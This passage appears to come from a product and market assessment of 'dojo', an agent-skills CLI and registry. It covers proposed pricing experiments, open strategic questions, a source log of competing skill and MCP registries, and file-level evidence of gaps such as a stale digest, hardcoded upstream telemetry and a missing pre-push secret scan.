| **E-01** | Engineering teams (5–50 devs) using Claude Code / Cursor / Antigravity will pay **\$10/seat/month** for a managed **Dojo Team Registry + CI Skill Security Gate** rather than managing a DIY GitHub repo. | Add a "Dojo for Teams (Private Registry, Org Sync & CI Prompt-Injection Gate)" section in `README.md` / GitHub Discussions or interview 5 DevEx leads currently using `dojo` / `sila`. | At least 3 of 5 DevEx leads state that DIY private GitHub repos lack required org-wide governance/auditability and commit to a paid pilot. | \$0 | 1 week | Determines whether `dojo` builds a commercial SaaS control plane (`Proceed` to Open-Core) or remains 100% OSS infrastructure (`Narrow` to OSS + Sila synergy). |
| **E-02** | Auto-pulling a user's linked Personal Skills Registry on `agy-vm` startup reduces remote VM setup friction from minutes to zero. | Test a 1-line shell hook (`dojo profile pull -g`) in `agy-vm` dotfiles across 5 remote agent sessions and measure time-to-first-skill-invocation. | 100% of custom local skills appear in `/home/antigravity/.gemini/skills` in <3 seconds with zero manual `git clone` steps. | \$0 | 2 days | Validates making `dojo profile pull -g` the flagship acquisition hook in tweets, docs, and the Google Antigravity feedback report. |

---

## 12. Open questions

| Question | Why it matters | Who can answer it | How |
| --- | --- | --- | --- |
| 1. Is `dojo` intended to be a standalone commercial product (Open-Core) or a free open-source adoption engine paired with `sila`? | Dictates whether `G-05` (no revenue model) is a critical business gap to build toward or a deliberate strategic choice. | Founder (`jadmadi`) | Explicit strategic decision after reviewing Section 3 & `E-01`. |
| 2. Should `dojo` maintain opt-in telemetry to `legacy-project` Firestore (`internal/telemetry/firestore.go:35`) or replace it? | Currently, telemetry writes go to the upstream `legacy-skill` author's Firebase project and silently drop any skill category outside the 7 hardcoded strings (`firestore.go:50-58`). | Founder (`jadmadi`) | Decide whether to deploy a Dojo telemetry endpoint or remove Firestore telemetry in `v1.3.0`. |
| 3. Will Google Antigravity (`agy-vm`) natively mount `/shared/user/.gemini/skills` into the agent skill loader in a future platform update? | If Antigravity fixes `/shared/user/.gemini/skills` discovery natively, `dojo profile pull -g` on `agy-vm` only needs to run once ever (persisting across all future VMs) instead of per-VM—making Dojo the easiest way to populate `/shared/user/.gemini/skills` from a laptop. | Google Antigravity engineering team | Track response to `jadmadi/agy-vm/docs/FEEDBACK_REMOTE_SKILLS_LOADING.md`. |

---

## Appendix A — Source log

| # | Source | URL | Accessed | Type | Claim used |
| --- | --- | --- | --- | --- | --- |
| S-01 | Cloudflare Agent Skills Discovery RFC (`v0.2.0`) | `https://github.com/cloudflare/agent-skills-discovery-rfc` | 2026-11-07 | Primary | `.well-known/agent-skills/index.json` discovery standard and SHA-256 integrity spec. |
| S-02 | Context7 Pricing & Plans (Upstash Inc.) | `https://context7.com/plans` | 2026-11-07 | Primary | Free (1,000 calls/mo, public repos), Pro (\$10/seat/mo, private repos + \$5/1M tokens), Enterprise (\$30 down to \$2.50/user/mo, SSO, SOC-2, LLM injection detection). |
| S-03 | Context7 GitHub Repository (`upstash/context7`) | `https://github.com/upstash/context7` | 2026-11-07 | Primary | `@upstash/context7-mcp` server + `ctx7` CLI packaging. |
| S-04 | Legacy CLI Agent Skills Catalog (`legacy-catalog.example.com`) | `https://legacy-catalog.example.com/` | 2026-11-07 | Primary | Upstream catalog hosted at `legacy-catalog.example.com` (`DefaultRemoteURL` in `dojo`). |
| S-05 | The Pragmatic Guide to Agent Skills (`legacy-catalog.example.com`) | `https://legacy-catalog.example.com/posts/the-pragmatic-guide-to-agent-skills/` | 2026-11-07 | Primary | Context bloat problem with loading full catalogs/skills and explicit `/skill` activation patterns in Antigravity. |
| S-06 | Smithery MCP & Skills Registry | `https://www.smithery.ai/` & `https://smithery.ai/future` | 2026-11-07 | Primary | MCP & skills registry (now part of Arcade); shutdown of legacy hosted MCP proxy on Oct 31, 2026 in favor of direct MCP URLs. |
| S-07 | Glama MCP Server Registry, Inspector & Gateway | `https://glama.ai/` & `https://glama.ai/mcp/faq` | 2026-11-07 | Primary | 117,219+ MCP servers scanned and scored; usage analytics and cost attribution gateway. |
| S-08 | Cursor Directory | `https://cursor.directory/` | 2026-11-07 | Primary | Community directory for Cursor rules and MCP plugins. |
| S-09 | Continue.dev & Continue Hub API | `https://continue.dev/` & `https://apis.io/providers/continue-dev/` | 2026-11-07 | Primary / Secondary | Continue Hub (`api.continue.dev`) rules/prompts/MCP registry; Continue acquired by Cursor. |
| S-10 | Dojo GitHub Release `v1.2.0` API metadata | `https://github.com/jadmadi/dojo/releases/tag/v1.2.0` | 2026-11-07 | Primary | Verified via `gh release view v1.2.0 --json tagName,assets` returning `{"assets":[],"tagName":"v1.2.0"}`. |

---

## Appendix B — File evidence

| File | Lines | What it proves |
| --- | --- | --- |
| `README.md` | `1–237` | External product claims: prebuilt binary install (`16–17`), RFC `v0.2.0` SHA-256 verification (`9`), `#section` paging (`59–75`), 7-harness sync (`77–100`), Personal Skills Registry (`102–123`), MCP server (`164–181`), `doctor` security scan (`185–193`). |
| `scripts/install.sh` | `1–70` | Installer attempts to download `releases/latest/download/dojo_${OS}_${ARCH}.tar.gz` (`47–54`), falls back to `go install` (`55–58`), fails if neither is available (`59–61`), and auto-bootstraps `dojo` skill globally (`65–67`). |
| `.goreleaser.yaml` | `1–40` | Configures multi-OS builds (`linux`, `darwin`, `windows` on `amd64`/`arm64`) packaged as `.tar.gz` and `.zip` (`27–32`), but no `.github/workflows` file exists to run it. |
| `internal/commands/upgrade.go` | `158–215` | `performSelfUpgrade` (`163–164`) explicitly skips `.tar.gz` and `.zip` assets (`!strings.HasSuffix(lower, ".tar.gz") && !strings.HasSuffix(lower, ".zip")`), contradicting `.goreleaser.yaml`. |
| `.well-known/agent-skills/index.json` | `1–23` | Line `11` lists stale digest `sha256:5bc9c1bbab5f169bb7297ab6a1a8b5b59a11cdcbbea203c36ee2145383d49913` for `skills/dojo/SKILL.md` (actual SHA-256 is `8055c469bc0d7c0d6eda7a5922946d7976b8e1ad42e492fa17a1c5f83d8384bf`). |
| `internal/commands/profile.go` | `88–678` | Implements `link`, `unlink`, `pull` (`apply`), `sync`, `push`, and `export`. Lines `563–678` (`pushSkillsToTarget`) clone, stage, commit, and `git push` packaged skills without running a pre-push secret or security scan. |
| `internal/commands/doctor.go` | `42–298` | Defines 4 static regex `securityPatterns` (`42–50`); records matches as `Severity: "warn"` (`223`); returns `ExitSuccess` (`0`) when `hasError == false` (`286–298`). |
| `internal/mcp/server.go` | `78–157` | `Tools()` exposes 6 MCP tools (`dojo_find`, `dojo_toc`, `dojo_load`, `dojo_run`, `dojo_learn`, `dojo_doctor`); omits `dojo_sync` and `dojo_profile`. |
| `internal/harness/sync.go` | `27–360` | Implements 7-harness projection (`SyncSkill`) and bi-directional reconciliation (`ReconcileHarnesses`) using `ModTime` comparison (`295–320`) and Cursor `.mdc` transpilation. |
| `internal/catalog/catalog.go` | `34–36` | Hardcodes `DefaultRemoteURL = "https://legacy-catalog.example.com/.well-known/agent-skills/index.json"`. |
| `internal/telemetry/firestore.go` | `33–58` | Hardcodes `DefaultFirestoreProjectID = "legacy-project"`, `DefaultReferer = "https://legacy-catalog.example.com/"`, and 7 allowed `validCategories`. |
| `skills/legacy-skill/SKILL.md` | `1–195` | Body is `7,378` bytes (`~1,845` tokens), exceeding `DefaultPageSize` (`6,000` bytes) and triggering a `budget:legacy-skill` warning in `dojo doctor --skills`. |

---

## Appendix C — Search scope

Searches performed to verify `Absent` findings:

| Finding | Paths / globs | Keywords | Result |
| --- | --- | --- | --- |
| No CI/CD release workflow for GoReleaser | `.github/**`, `**/*workflow*`, `**/*release*` | `goreleaser`, `github/workflows` | `.github/workflows` directory does not exist; only `.goreleaser.yaml` exists at root. |
| No billing, payment, or commercial tier implementation | `internal/**`, `cmd/**`, `scripts/**`, `README.md` | `stripe`, `paddle`, `lemonsqueezy`, `billing`, `subscription`, `pricing`, `invoice`, `plan`, `tier`, `license_key` | 0 code matches (`collect-signals.mjs` confirmed 0 billing signals). |
| No enterprise auth / RBAC / SSO / compliance docs | `internal/**`, `README.md`, `_design/**` | `SSO`, `SAML`, `OIDC`, `RBAC`, `SOC2`, `GDPR`, `PDPL`, `DPA`, `retention` | 0 matches. |
| No pre-push secret scan in `dojo profile push` | `internal/commands/profile.go`, `internal/profile/profile.go` | `securityPatterns`, `doctor`, `secret`, `token`, `gitleaks` | 0 matches in `profile.go` (`GITHUB_TOKEN`/`GH_TOKEN` used only for repo auth on lines `577–610`). |
| No `sync` or `profile` tools in MCP server | `internal/mcp/server.go`, `internal/commands/mcp.go` | `dojo_sync`, `dojo_profile`, `dojo_sila` | 0 matches; only `dojo_find`, `dojo_toc`, `dojo_load`, `dojo_run`, `dojo_learn`, and `dojo_doctor` are registered. |
